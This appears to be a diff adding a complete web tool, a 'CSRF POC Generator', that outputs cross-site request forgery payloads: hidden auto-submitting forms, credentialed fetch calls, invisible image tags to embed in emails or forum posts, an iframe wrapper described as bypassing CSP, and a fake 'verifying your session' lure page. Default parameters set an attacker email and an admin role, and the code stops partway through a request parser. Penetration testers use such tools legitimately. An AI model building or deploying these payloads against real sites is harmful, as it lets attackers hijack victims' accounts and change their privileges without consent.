@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF POC Generator // 0xHaise</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Outfit:wght@300;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Outfit', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        hacker: {
+                            accent: '#00f3ff',
+                            danger: '#ff2a6d',
+                            purple: '#b94fff',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        :root {
+            --bg-color: #050505;
+            --text-primary: #e5e7eb;
+            --text-secondary: #9ca3af;
+            --panel-bg: rgba(18, 18, 18, 0.65);
+            --panel-border: rgba(255, 255, 255, 0.08);
+            --input-bg: rgba(0, 0, 0, 0.4);
+            --card-hover: rgba(255, 255, 255, 0.05);
+            --accent-glow: rgba(0, 243, 255, 0.2);
+            --danger-glow: rgba(255, 42, 109, 0.2);
+            --scrollbar-track: #0a0a0a;
+            --scrollbar-thumb: #333;
+            --toast-bg: rgba(10, 10, 10, 0.95);
+            --toast-text: #fff;
+        }
+
+        html { background-color: var(--bg-color); }
+        body { background-color: transparent; color: var(--text-primary); }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--scrollbar-track); }
+        ::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00f3ff; }
+
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
+
+        .glass-panel {
+            background: var(--panel-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--panel-border);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .glass-input {
+            background: var(--input-bg);
+            border: 1px solid var(--panel-border);
+            color: var(--text-primary);
+            transition: all 0.3s ease;
+        }
+        .glass-input:focus { outline: none; border-color: #00f3ff; box-shadow: 0 0 15px var(--accent-glow); }
+        select.glass-input option { background: #111; color: #e5e7eb; }
+
+        .param-row {
+            background: var(--input-bg);
+            border: 1px solid var(--panel-border);
+            transition: all 0.2s ease;
+        }
+        .param-row:hover { border-color: rgba(0, 243, 255, 0.3); }
+
+        .btn-accent {
+            background: rgba(0, 243, 255, 0.1);
+            border: 1px solid #00f3ff;
+            color: #00f3ff;
+            transition: all 0.3s ease;
+        }
+        .btn-accent:hover {
+            background: rgba(0, 243, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
+        }
+
+        .btn-danger {
+            background: rgba(255, 42, 109, 0.1);
+            border: 1px solid #ff2a6d;
+            color: #ff2a6d;
+            transition: all 0.3s ease;
+        }
+        .btn-danger:hover {
+            background: rgba(255, 42, 109, 0.2);
+            box-shadow: 0 0 20px var(--danger-glow);
+        }
+
+        .btn-ghost {
+            background: transparent;
+            border: 1px solid var(--panel-border);
+            color: var(--text-secondary);
+            transition: all 0.2s ease;
+        }
+        .btn-ghost:hover { border-color: rgba(0, 243, 255, 0.4); color: #00f3ff; }
+
+        .tab-btn {
+            background: transparent;
+            border-bottom: 2px solid transparent;
+            color: var(--text-secondary);
+            transition: all 0.2s ease;
+            padding-bottom: 6px;
+        }
+        .tab-btn.active { color: #00f3ff; border-bottom-color: #00f3ff; }
+        .tab-btn:hover { color: var(--text-primary); }
+
+        .code-output {
+            background: #0a0a0a;
+            border: 1px solid var(--panel-border);
+            color: #a8ff78;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+            white-space: pre-wrap;
+            word-break: break-all;
+            min-height: 200px;
+        }
+
+        .method-pill {
+            display: inline-block;
+            padding: 1px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .method-get { background: rgba(0, 243, 255, 0.15); color: #00f3ff; border: 1px solid rgba(0, 243, 255, 0.3); }
+        .method-post { background: rgba(255, 165, 0, 0.15); color: #ffa500; border: 1px solid rgba(255, 165, 0, 0.3); }
+        .method-put { background: rgba(185, 79, 255, 0.15); color: #b94fff; border: 1px solid rgba(185, 79, 255, 0.3); }
+        .method-delete { background: rgba(255, 42, 109, 0.15); color: #ff2a6d; border: 1px solid rgba(255, 42, 109, 0.3); }
+        .method-patch { background: rgba(168, 255, 120, 0.15); color: #a8ff78; border: 1px solid rgba(168, 255, 120, 0.3); }
+
+        #toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
+        .toast {
+            background: var(--toast-bg); border-left: 4px solid #00f3ff; color: var(--toast-text);
+            padding: 12px 24px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 13px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: slideIn 0.3s ease-out forwards; opacity: 0; transform: translateX(20px);
+            max-width: 340px;
+        }
+        .toast.error { border-color: #ff2a6d; }
+        .toast.success { border-color: #a8ff78; }
+        @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }
+        @keyframes fadeOut { to { opacity: 0; transform: translateY(10px); } }
+
+        .glow-text { text-shadow: 0 0 20px rgba(0, 243, 255, 0.5); }
+        .danger-glow-text { text-shadow: 0 0 20px rgba(255, 42, 109, 0.5); }
+
+        .encode-badge {
+            font-size: 10px;
+            padding: 1px 5px;
+            border-radius: 2px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .section-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.15em;
+            color: #00f3ff;
+        }
+
+        .remove-btn {
+            color: var(--text-secondary);
+            transition: color 0.2s;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            line-height: 1;
+            padding: 2px 4px;
+        }
+        .remove-btn:hover { color: #ff2a6d; }
+
+        /* Scanline animation on output */
+        .code-output-wrapper {
+            position: relative;
+            overflow: hidden;
+        }
+        .code-output-wrapper::after {
+            content: '';
+            position: absolute;
+            top: -100%;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: rgba(0, 243, 255, 0.06);
+            animation: scanline 4s linear infinite;
+        }
+        @keyframes scanline {
+            0% { top: -2px; }
+            100% { top: 100%; }
+        }
+
+        .iframe-preview {
+            background: #0a0a0a;
+            border: 1px solid var(--panel-border);
+            width: 100%;
+            min-height: 160px;
+            border-radius: 6px;
+        }
+
+        .checkbox-custom {
+            appearance: none;
+            width: 16px; height: 16px;
+            border: 1px solid var(--panel-border);
+            background: var(--input-bg);
+            border-radius: 3px;
+            cursor: pointer;
+            position: relative;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+        .checkbox-custom:checked {
+            background: rgba(0, 243, 255, 0.15);
+            border-color: #00f3ff;
+        }
+        .checkbox-custom:checked::after {
+            content: '✓';
+            position: absolute;
+            top: -1px; left: 2px;
+            font-size: 12px;
+            color: #00f3ff;
+        }
+    </style>
+</head>
+<body class="antialiased overflow-x-hidden min-h-screen flex flex-col font-sans">
+
+    <canvas id="bg-canvas"></canvas>
+    <div id="toast-container"></div>
+
+    <!-- Header -->
+    <header class="border-b border-white/[0.06] backdrop-blur-md sticky top-0 z-50" style="background: rgba(5,5,5,0.8);">
+        <div class="container mx-auto px-4 max-w-6xl h-14 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ff2a6d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                <span class="font-mono text-sm font-bold tracking-wider">
+                    <span class="text-white">CSRF</span><span class="text-hacker-accent">_POC</span>
+                    <span class="text-white/30 ml-1 font-normal">// Generator</span>
+                </span>
+            </div>
+            <div class="flex items-center gap-4 text-xs font-mono text-white/30">
+                <span class="hidden md:block">Github: <span class="text-hacker-accent">0xHaise</span></span>
+                <span class="px-2 py-0.5 rounded border border-hacker-danger/30 text-hacker-danger">⚠ FOR AUTHORIZED TESTING ONLY</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow container mx-auto px-4 py-8 relative z-10 max-w-6xl">
+
+        <!-- Title Block -->
+        <div class="mb-8">
+            <h1 class="text-3xl font-bold font-mono glow-text text-hacker-accent mb-1">CSRF POC GENERATOR</h1>
+            <p class="text-sm text-white/40 font-mono">// Generate proof-of-concept payloads for Cross-Site Request Forgery vulnerabilities</p>
+        </div>
+
+        <!-- Main Grid -->
+        <div class="grid grid-cols-1 lg:grid-cols-5 gap-6">
+
+            <!-- LEFT: Input Panel -->
+            <div class="lg:col-span-2 flex flex-col gap-5">
+
+                <!-- Target URL -->
+                <div class="glass-panel rounded-xl p-5">
+                    <p class="section-label mb-3">// TARGET CONFIGURATION</p>
+
+                    <div class="mb-4">
+                        <label class="block text-xs font-mono text-white/50 mb-1.5">Target URL</label>
+                        <input type="text" id="target-url" placeholder="https://target.com/api/update-email"
+                            class="glass-input w-full rounded-lg py-2.5 px-4 font-mono text-sm">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3 mb-4">
+                        <div>
+                            <label class="block text-xs font-mono text-white/50 mb-1.5">HTTP Method</label>
+                            <select id="http-method" class="glass-input w-full rounded-lg py-2.5 px-3 font-mono text-sm">
+                                <option value="POST">POST</option>
+                                <option value="GET">GET</option>
+                                <option value="PUT">PUT</option>
+                                <option value="PATCH">PATCH</option>
+                                <option value="DELETE">DELETE</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-mono text-white/50 mb-1.5">Content-Type</label>
+                            <select id="content-type" class="glass-input w-full rounded-lg py-2.5 px-3 font-mono text-sm">
+                                <option value="application/x-www-form-urlencoded">Form URL-Encoded</option>
+                                <option value="multipart/form-data">Multipart Form</option>
+                                <option value="text/plain">text/plain</option>
+                                <option value="application/json">JSON (fetch)</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-mono text-white/50 mb-1.5">Page Title (shown in POC)</label>
+                        <input type="text" id="poc-title" placeholder="CSRF POC" value="CSRF POC"
+                            class="glass-input w-full rounded-lg py-2.5 px-4 font-mono text-sm">
+                    </div>
+                </div>
+
+                <!-- Parameters -->
+                <div class="glass-panel rounded-xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="section-label">// PARAMETERS</p>
+                        <button onclick="addParam()" class="btn-ghost rounded px-3 py-1 text-xs font-mono flex items-center gap-1.5">
+                            <span class="text-hacker-accent">+</span> ADD PARAM
+                        </button>
+                    </div>
+
+                    <div id="params-container" class="flex flex-col gap-2"></div>
+
+                    <p class="text-xs font-mono text-white/25 mt-3">// Add request parameters — name/value pairs</p>
+                </div>
+
+                <!-- Options -->
+                <div class="glass-panel rounded-xl p-5">
+                    <p class="section-label mb-3">// OPTIONS</p>
+
+                    <div class="flex flex-col gap-3">
+                        <label class="flex items-center gap-3 cursor-pointer">
+                            <input type="checkbox" id="opt-autosubmit" class="checkbox-custom" checked>
+                            <span class="text-sm font-mono text-white/70">Auto-submit on load</span>
+                        </label>
+                        <label class="flex items-center gap-3 cursor-pointer">
+                            <input type="checkbox" id="opt-hidden" class="checkbox-custom" checked>
+                            <span class="text-sm font-mono text-white/70">Hide form (invisible iframe)</span>
+                        </label>
+                        <label class="flex items-center gap-3 cursor-pointer">
+                            <input type="checkbox" id="opt-iframe" class="checkbox-custom">
+                            <span class="text-sm font-mono text-white/70">Wrap in iframe (bypass CSP)</span>
+                        </label>
+                        <label class="flex items-center gap-3 cursor-pointer">
+                            <input type="checkbox" id="opt-cors" class="checkbox-custom">
+                            <span class="text-sm font-mono text-white/70">Include CORS headers note</span>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Import from Burp -->
+                <div class="glass-panel rounded-xl p-5">
+                    <p class="section-label mb-3">// IMPORT FROM BURP SUITE</p>
+                    <textarea id="burp-raw" placeholder="Paste raw HTTP request here...&#10;&#10;POST /api/update HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;email=attacker%40evil.com&user=admin"
+                        class="glass-input w-full rounded-lg py-2.5 px-4 font-mono text-xs resize-none h-32" style="line-height:1.6;"></textarea>
+                    <button onclick="parseRawRequest()" class="mt-3 w-full btn-ghost rounded-lg py-2 text-xs font-mono tracking-wider uppercase">
+                        ⇒ Parse &amp; Import
+                    </button>
+                </div>
+
+            </div>
+
+            <!-- RIGHT: Output Panel -->
+            <div class="lg:col-span-3 flex flex-col gap-5">
+
+                <!-- POC Type Tabs -->
+                <div class="glass-panel rounded-xl p-5">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex gap-5 border-b border-white/[0.06] w-full pb-0">
+                            <button class="tab-btn active text-xs font-mono uppercase tracking-wider pb-2" data-tab="html-form" onclick="switchTab(this, 'html-form')">HTML Form</button>
+                            <button class="tab-btn text-xs font-mono uppercase tracking-wider pb-2" data-tab="fetch-js" onclick="switchTab(this, 'fetch-js')">Fetch / XHR</button>
+                            <button class="tab-btn text-xs font-mono uppercase tracking-wider pb-2" data-tab="img-tag" onclick="switchTab(this, 'img-tag')">IMG Tag</button>
+                            <button class="tab-btn text-xs font-mono uppercase tracking-wider pb-2" data-tab="full-page" onclick="switchTab(this, 'full-page')">Full Page</button>
+                        </div>
+                    </div>
+
+                    <!-- Active Tab Desc -->
+                    <div id="tab-desc" class="text-xs font-mono text-white/35 mb-4">
+                        // Standard HTML form — works against most CSRF vulnerabilities with form-based endpoints
+                    </div>
+
+                    <!-- Generate Button -->
+                    <button onclick="generatePOC()" class="btn-danger w-full rounded-lg py-3 font-mono font-bold text-sm uppercase tracking-wider mb-4 flex items-center justify-center gap-2">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                        GENERATE POC
+                    </button>
+
+                    <!-- Code Output -->
+                    <div class="code-output-wrapper rounded-lg overflow-hidden mb-3">
+                        <div class="flex items-center justify-between bg-[#0a0a0a] border-b border-white/[0.06] px-4 py-2">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-hacker-danger/60"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500/60"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500/60"></span>
+                                <span class="text-xs font-mono text-white/30 ml-2" id="output-filename">csrf_poc.html</span>
+                            </div>
+                            <div class="flex gap-2">
+                                <button onclick="copyOutput()" class="text-xs font-mono text-white/40 hover:text-hacker-accent transition-colors">[ COPY ]</button>
+                                <button onclick="downloadPOC()" class="text-xs font-mono text-white/40 hover:text-hacker-accent transition-colors">[ DOWNLOAD ]</button>
+                            </div>
+                        </div>
+                        <textarea id="code-output" class="code-output w-full p-4 resize-none rounded-b-lg" rows="16" readonly placeholder="// Click GENERATE POC to build your payload...&#10;// Configure target URL and parameters on the left."></textarea>
+                    </div>
+
+                    <!-- Line count -->
+                    <div class="flex items-center justify-between">
+                        <span class="text-xs font-mono text-white/25" id="line-count">// 0 lines</span>
+                        <span class="text-xs font-mono text-white/25" id="byte-count">0 bytes</span>
+                    </div>
+                </div>
+
+                <!-- Live Preview -->
+                <div class="glass-panel rounded-xl p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="section-label">// LIVE PREVIEW</p>
+                        <div class="flex gap-2">
+                            <button onclick="renderPreview()" class="btn-ghost rounded px-3 py-1 text-xs font-mono">⟳ RENDER</button>
+                            <button onclick="openInNewTab()" class="btn-ghost rounded px-3 py-1 text-xs font-mono">↗ OPEN</button>
+                        </div>
+                    </div>
+                    <div class="relative rounded-lg overflow-hidden border border-white/[0.06]" style="background:#0a0a0a;">
+                        <div class="flex items-center gap-1.5 px-3 py-2 border-b border-white/[0.06] bg-black/30">
+                            <svg width="12" height="12" fill="none" stroke="#9ca3af" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+                            <span class="text-xs font-mono text-white/30 flex-1 truncate" id="preview-url-bar">about:blank</span>
+                        </div>
+                        <iframe id="preview-frame" class="w-full border-0" style="height:200px; background:#0a0a0a;" sandbox="allow-scripts allow-same-origin"></iframe>
+                    </div>
+                    <p class="text-xs font-mono text-hacker-danger/50 mt-2">⚠ Sandbox mode — form submission disabled in preview</p>
+                </div>
+
+                <!-- Checklist -->
+                <div class="glass-panel rounded-xl p-5">
+                    <p class="section-label mb-3">// CSRF CHECKLIST</p>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-2" id="checklist">
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>No CSRF token in request</span>
+                        </div>
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>SameSite cookie not set / Lax</span>
+                        </div>
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>Origin / Referer not validated</span>
+                        </div>
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>State-changing operation</span>
+                        </div>
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>Session cookie auto-sent by browser</span>
+                        </div>
+                        <div class="checklist-item flex items-start gap-2 text-xs font-mono text-white/50 p-2 rounded border border-white/[0.04]">
+                            <span class="text-hacker-accent mt-0.5">□</span>
+                            <span>Custom headers not required</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="border-t border-white/[0.04] py-5 mt-8 relative z-10">
+        <div class="container mx-auto px-4 max-w-6xl flex flex-col md:flex-row items-center justify-between gap-3">
+            <span class="text-xs font-mono text-white/20">// CSRF POC Generator — 0xHaise</span>
+            <span class="text-xs font-mono text-hacker-danger/40">FOR AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is illegal.</span>
+        </div>
+    </footer>
+
+<script>
+// ─── BACKGROUND CANVAS ───────────────────────────────────────────────────────
+(function() {
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let W, H, particles = [];
+
+    function resize() {
+        W = canvas.width = window.innerWidth;
+        H = canvas.height = window.innerHeight;
+    }
+    resize();
+    window.addEventListener('resize', resize);
+
+    for (let i = 0; i < 55; i++) {
+        particles.push({
+            x: Math.random() * 2000, y: Math.random() * 2000,
+            vx: (Math.random() - 0.5) * 0.3, vy: (Math.random() - 0.5) * 0.3,
+            size: Math.random() * 1.5 + 0.3, alpha: Math.random() * 0.4 + 0.05
+        });
+    }
+
+    function draw() {
+        ctx.clearRect(0, 0, W, H);
+        ctx.fillStyle = '#050505';
+        ctx.fillRect(0, 0, W, H);
+
+        // Grid
+        ctx.strokeStyle = 'rgba(0, 243, 255, 0.03)';
+        ctx.lineWidth = 1;
+        for (let x = 0; x < W; x += 60) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke(); }
+        for (let y = 0; y < H; y += 60) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke(); }
+
+        particles.forEach(p => {
+            p.x += p.vx; p.y += p.vy;
+            if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
+            if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+            ctx.fillStyle = `rgba(0, 243, 255, ${p.alpha})`;
+            ctx.fill();
+        });
+        requestAnimationFrame(draw);
+    }
+    draw();
+})();
+
+// ─── STATE ────────────────────────────────────────────────────────────────────
+let params = [];
+let paramIdCounter = 0;
+let activeTab = 'html-form';
+let generatedCode = '';
+
+const tabDescs = {
+    'html-form': '// Standard HTML form — works against most CSRF vulnerabilities with form-based endpoints',
+    'fetch-js': '// Fetch API / XHR payload — useful for JSON endpoints and same-origin policy bypasses',
+    'img-tag': '// IMG tag technique — works for GET-based CSRF with no body parameters',
+    'full-page': '// Full decoy page — social engineering POC with realistic-looking lure page',
+};
+
+// ─── INIT ─────────────────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+    addParam('email', 'attacker@evil.com');
+    addParam('role', 'admin');
+});
+
+// ─── PARAMS ──────────────────────────────────────────────────────────────────
+function addParam(name = '', value = '') {
+    const id = ++paramIdCounter;
+    params.push({ id, name, value });
+    renderParams();
+}
+
+function removeParam(id) {
+    params = params.filter(p => p.id !== id);
+    renderParams();
+}
+
+function renderParams() {
+    const container = document.getElementById('params-container');
+    if (params.length === 0) {
+        container.innerHTML = `<div class="text-xs font-mono text-white/25 py-3 text-center border border-dashed border-white/[0.06] rounded-lg">No parameters — click ADD PARAM</div>`;
+        return;
+    }
+    container.innerHTML = params.map(p => `
+        <div class="param-row rounded-lg p-2.5 flex gap-2 items-center">
+            <input type="text" placeholder="name" value="${escHtml(p.name)}"
+                class="glass-input flex-1 rounded py-1.5 px-2.5 font-mono text-xs" style="min-width:0;"
+                oninput="updateParam(${p.id}, 'name', this.value)">
+            <span class="text-white/20 font-mono text-xs">=</span>
+            <input type="text" placeholder="value" value="${escHtml(p.value)}"
+                class="glass-input flex-1 rounded py-1.5 px-2.5 font-mono text-xs" style="min-width:0;"
+                oninput="updateParam(${p.id}, 'value', this.value)">
+            <button class="remove-btn" onclick="removeParam(${p.id})">✕</button>
+        </div>
+    `).join('');
+}
+
+function updateParam(id, field, value) {
+    const p = params.find(p => p.id === id);
+    if (p) p[field] = value;
+}
+
+// ─── TABS ─────────────────────────────────────────────────────────────────────
+function switchTab(btn, tab) {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    activeTab = tab;
+    document.getElementById('tab-desc').textContent = tabDescs[tab];
+    updateFilename();
+}
+
+function updateFilename() {
+    const map = { 'html-form': 'csrf_form.html', 'fetch-js': 'csrf_fetch.js', 'img-tag': 'csrf_img.html', 'full-page': 'csrf_decoy.html' };
+    document.getElementById('output-filename').textContent = map[activeTab] || 'csrf_poc.html';
+}
+
+// ─── GENERATE ─────────────────────────────────────────────────────────────────
+function generatePOC() {
+    const url = document.getElementById('target-url').value.trim();
+    const method = document.getElementById('http-method').value;
+    const ct = document.getElementById('content-type').value;
+    const title = document.getElementById('poc-title').value.trim() || 'CSRF POC';
+    const autoSubmit = document.getElementById('opt-autosubmit').checked;
+    const hidden = document.getElementById('opt-hidden').checked;
+    const wrapIframe = document.getElementById('opt-iframe').checked;
+    const corsNote = document.getElementById('opt-cors').checked;
+
+    if (!url) {
+        showToast('⚠ TARGET URL REQUIRED', 'error');
+        document.getElementById('target-url').focus();
+        return;
+    }
+
+    let code = '';
+
+    if (activeTab === 'html-form') {
+        code = generateHTMLForm(url, method, ct, title, autoSubmit, hidden, wrapIframe, corsNote);
+    } else if (activeTab === 'fetch-js') {
+        code = generateFetch(url, method, ct, title, autoSubmit);
+    } else if (activeTab === 'img-tag') {
+        code = generateImgTag(url, title);
+    } else if (activeTab === 'full-page') {
+        code = generateFullPage(url, method, ct, title, autoSubmit);
+    }
+
+    generatedCode = code;
+    const output = document.getElementById('code-output');
+    output.value = code;
+    const lines = code.split('\n').length;
+    const bytes = new TextEncoder().encode(code).length;
+    document.getElementById('line-count').textContent = `// ${lines} lines`;
+    document.getElementById('byte-count').textContent = `${bytes} bytes`;
+    updateFilename();
+    showToast('✔ POC GENERATED', 'success');
+}
+
+function buildFormFields(hidden) {
+    return params.map(p =>
+        `    <input type="${hidden ? 'hidden' : 'text'}" name="${escAttr(p.name)}" value="${escAttr(p.value)}">`
+    ).join('\n');
+}
+
+function buildQueryString() {
+    return params.map(p => `${encodeURIComponent(p.name)}=${encodeURIComponent(p.value)}`).join('&');
+}
+
+function buildJSON() {
+    const obj = {};
+    params.forEach(p => { obj[p.name] = p.value; });
+    return JSON.stringify(obj, null, 2);
+}
+
+function generateHTMLForm(url, method, ct, title, autoSubmit, hidden, wrapIframe, corsNote) {
+    const fields = buildFormFields(hidden);
+    const style = hidden ? 'display:none;visibility:hidden;' : '';
+    const autoJS = autoSubmit ? `\n    <script>document.getElementById('csrf-form').submit();<\/script>` : '';
+    const enctype = (ct === 'multipart/form-data') ? ` enctype="multipart/form-data"` : (ct === 'text/plain') ? ` enctype="text/plain"` : '';
+    const corsComment = corsNote ? `\n    <!-- NOTE: This requires browser to send cookies. Verify SameSite=None or absence of SameSite on session cookie. -->` : '';
+
+    let inner = `<!DOCTYPE html>
+<html>
+<head><title>${escHtml(title)}</title></head>
+<body>${corsComment}
+  <form id="csrf-form" action="${escAttr(url)}" method="${method}"${enctype} style="${style}">
+${fields}
+    <input type="submit" value="Submit">
+  </form>${autoJS}
+</body>
+</html>`;
+
+    if (wrapIframe) {
+        const blob = btoa(unescape(encodeURIComponent(inner)));
+        return `<!DOCTYPE html>
+<html>
+<head><title>${escHtml(title)}</title></head>
+<body>
+  <!-- CSRF via sandboxed iframe blob -->
+  <iframe id="csrf-iframe" style="display:none;" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+  <script>
+    const payload = atob("${blob}");
+    const blob = new Blob([payload], {type:'text/html'});
+    document.getElementById('csrf-iframe').src = URL.createObjectURL(blob);
+  <\/script>
+</body>
+</html>`;
+    }
+    return inner;
+}
+
+function generateFetch(url, method, ct, title, autoSubmit) {
+    let bodyCode;
+    if (ct === 'application/json') {
+        bodyCode = `  body: JSON.stringify(${buildJSON()}),`;
+    } else {
+        bodyCode = `  body: new URLSearchParams({\n${params.map(p=>`    ${JSON.stringify(p.name)}: ${JSON.stringify(p.value)}`).join(',\n')}\n  }),`;
+    }
+
+    const fetchCode = `fetch("${url}", {
+  method: "${method}",
+  credentials: "include",
+  headers: {
+    "Content-Type": "${ct}"
+  },
+${bodyCode}
+})
+.then(r => r.text())
+.then(data => {
+  // Response received — CSRF successful
+  console.log("[CSRF]", data);
+});`;
+
+    if (!autoSubmit) return fetchCode;
+
+    return `<!DOCTYPE html>
+<html>
+<head><title>${escHtml(title)}</title></head>
+<body>
+<script>
+${fetchCode}
+<\/script>
+</body>
+</html>`;
+}
+
+function generateImgTag(url, title) {
+    const qs = buildQueryString();
+    const fullUrl = qs ? `${url}?${qs}` : url;
+    return `<!-- CSRF via IMG tag (GET only) -->
+<!-- Embed this anywhere: email body, forum post, other website -->
+
+<img src="${escAttr(fullUrl)}"
+     width="1" height="1" border="0"
+     alt="" style="display:none;">
+
+<!-- Or as a full page: -->
+<!DOCTYPE html>
+<html>
+<head><title>${escHtml(title)}</title></head>
+<body>
+  <img src="${escAttr(fullUrl)}" width="0" height="0" style="display:none;">
+  <p>Loading...</p>
+</body>
+</html>`;
+}
+
+function generateFullPage(url, method, ct, title, autoSubmit) {
+    const fields = buildFormFields(true);
+    const enctype = (ct === 'multipart/form-data') ? ` enctype="multipart/form-data"` : '';
+    return `<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Verification Required</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+           background: #f5f5f5; display: flex; align-items: center; justify-content: center;
+           min-height: 100vh; }
+    .card { background: #fff; border-radius: 12px; padding: 40px; max-width: 420px;
+            width: 90%; box-shadow: 0 4px 24px rgba(0,0,0,0.1); text-align: center; }
+    .spinner { width: 40px; height: 40px; border: 3px solid #e5e7eb;
+               border-top-color: #3b82f6; border-radius: 50%;
+               animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { color: #1f2937; font-size: 20px; margin-bottom: 8px; }
+    p  { color: #6b7280; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="spinner"></div>
+    <h2>Verifying your session...</h2>
+    <p>Please wait while we verify your identity. Do not close this window.</p>
+  </div>
+
+  <!-- Hidden CSRF form -->
+  <form id="csrf-form" action="${escAttr(url)}" method="${method}"${enctype} style="display:none;">
+${fields}
+  </form>
+
+  <script>
+    // ${title} — generated by CSRF POC Generator (0xHaise)
+    ${autoSubmit ? "window.addEventListener('load', () => document.getElementById('csrf-form').submit());" : "// Auto-submit disabled — trigger manually: document.getElementById('csrf-form').submit()"}
+  <\/script>
+</body>
+</html>`;
+}
+
+// ─── PARSE RAW REQUEST ────────────────────────────────────────────────────────
+function parseRawRequest() {
+    const raw = document.getElementById('burp-raw').value.trim();
+    if (!raw) { showToast('⚠ PASTE A RAW REQUEST FIRST', 'error'); return; }
+
+    const lines = raw.split('\n');
+    const firstLine = lines[0].trim();
+    const parts = firstLine.split(' ');
+    if (parts.length < 3) { showToast('⚠ INVALID REQUEST FORMAT', 'error'); return; }
+
+    const method = parts[0].toUpperCase();
